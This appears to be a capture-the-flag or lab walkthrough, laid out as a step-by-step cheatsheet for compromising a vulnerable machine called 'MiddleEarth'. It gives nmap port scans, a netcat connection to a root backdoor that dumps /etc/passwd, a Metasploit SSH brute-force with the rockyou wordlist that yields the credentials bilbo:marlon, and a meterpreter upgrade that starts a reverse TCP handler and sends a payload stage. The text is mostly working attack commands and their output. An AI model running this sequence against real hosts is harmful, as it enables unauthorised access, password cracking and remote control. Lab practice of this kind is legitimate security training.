# Commands and cheatsheet

## Step 1

Nmap scan 
```
nmap -sV 192.168.2.21

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-13 19:49 EAT
Nmap scan report for 192.168.2.21
Host is up (0.27s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 37.61 seconds
```


```
nmap -p- -Pn -T4 --max-retries 1 -sV 192.168.2.21 -vv
Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-13 19:50 EAT
NSE: Loaded 42 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 19:50
Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed
Initiating Connect Scan at 19:50
Scanning 192.168.2.21 [65535 ports]
Discovered open port 80/tcp on 192.168.2.21
Discovered open port 445/tcp on 192.168.2.21
Discovered open port 139/tcp on 192.168.2.21
Warning: 192.168.2.21 giving up on port because retransmission cap hit (1).
Discovered open port 3306/tcp on 192.168.2.21
Discovered open port 22/tcp on 192.168.2.21
Connect Scan Timing: About 2.56% done; ETC: 20:10 (0:19:42 remaining)
Connect Scan Timing: About 5.33% done; ETC: 20:09 (0:18:04 remaining)
Discovered open port 65534/tcp on 192.168.2.21
Connect Scan Timing: About 9.03% done; ETC: 20:08 (0:16:47 remaining)
Connect Scan Timing: About 12.70% done; ETC: 20:07 (0:14:54 remaining)
Connect Scan Timing: About 19.94% done; ETC: 20:07 (0:13:55 remaining)
Connect Scan Timing: About 23.78% done; ETC: 20:07 (0:13:02 remaining)
Connect Scan Timing: About 28.19% done; ETC: 20:07 (0:12:08 remaining)
Connect Scan Timing: About 36.11% done; ETC: 20:07 (0:11:16 remaining)
Connect Scan Timing: About 45.29% done; ETC: 20:09 (0:10:17 remaining)
Connect Scan Timing: About 49.49% done; ETC: 20:08 (0:09:18 remaining)
Connect Scan Timing: About 55.20% done; ETC: 20:09 (0:08:22 remaining)
Connect Scan Timing: About 60.47% done; ETC: 20:09 (0:07:26 remaining)
Connect Scan Timing: About 65.42% done; ETC: 20:09 (0:06:28 remaining)
Connect Scan Timing: About 71.32% done; ETC: 20:09 (0:05:28 remaining)
Connect Scan Timing: About 76.78% done; ETC: 20:09 (0:04:26 remaining)
Completed Connect Scan at 20:06, 970.99s elapsed (65535 total ports)
Initiating Service scan at 20:06
Scanning 6 services on 192.168.2.21
Completed Service scan at 20:06, 0.00s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.2.21.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:06
Completed NSE at 20:06, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:06
Completed NSE at 20:06, 0.01s elapsed
Nmap scan report for 192.168.2.21
Host is up, received user-set (0.0000060s latency).
Scanned at 2022-04-13 19:50:20 EAT for 971s
Not shown: 45483 closed ports, 20046 filtered ports
Reason: 45483 conn-refused, 16800 net-unreaches and 3246 no-responses
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  tcpwrapped syn-ack
80/tcp    open  tcpwrapped syn-ack
139/tcp   open  tcpwrapped syn-ack
445/tcp   open  tcpwrapped syn-ack
3306/tcp  open  tcpwrapped syn-ack
65534/tcp open  tcpwrapped syn-ack

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 972.19 seconds

```


## Step 2
Connect to the backdoor at 65534
### Note that the port for the backdoor may change
```
nc 192.168.2.21 65534 -vvv

whoami
root
cat /etc/passwd
strings /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:50::/home/ftp:
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
pop:x:90:90:POP:/:
nobody:x:99:99:nobody:/:
postgres:x:1000:100::/home/postgres:
frodo:x:1001:100::/home/frodo:
bilbo:x:1002:100::/home/bilbo:
samwise:x:1003:100::/home/samwise:
faramir:x:1004:100::/home/faramir:

```

### I found the bilbo user in the /etc/passwd 
```
I found the bilbo
```

### Logging in Via ssh
Set msfconsole as follows
````
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   PASSWORD          marlon                            no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
   RHOSTS            192.168.2.21                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22                                yes       The target port
   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
   THREADS           1                                 yes       The number of concurrent threads (max one per host)
   USERNAME          bilbo                             no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                             no        Try the username as the password for all users
   USER_FILE                                           no        File containing usernames, one per line
   VERBOSE           false                             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true


then exploit
````


### Loggin in with the found credentials
```
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME bilbo
USERNAME => bilbo
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD marlon
PASSWORD => marlon
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

[*] 192.168.2.21:22 - Starting bruteforce
[+] 192.168.2.21:22 - Success: 'bilbo:marlon' 'uid=1002(bilbo) gid=100(users) groups=100(users) Linux MiddleEarth 2.6.20-BT-PwnSauce-NOSMP #3 Sat Feb 24 15:52:59 GMT 2007 i686 i686 i386 GNU/Linux '
[*] Command shell session 3 opened (192.168.2.126:36247 -> 192.168.2.21:22) at 2022-04-13 20:55:05 +0300
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### Upgrading the meterpreter session
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 3
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.2.126:4433 
[*] Sending stage (984904 bytes) to 192.168.2.21
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 auxiliary(scanner/ssh/ssh_login) > 

```

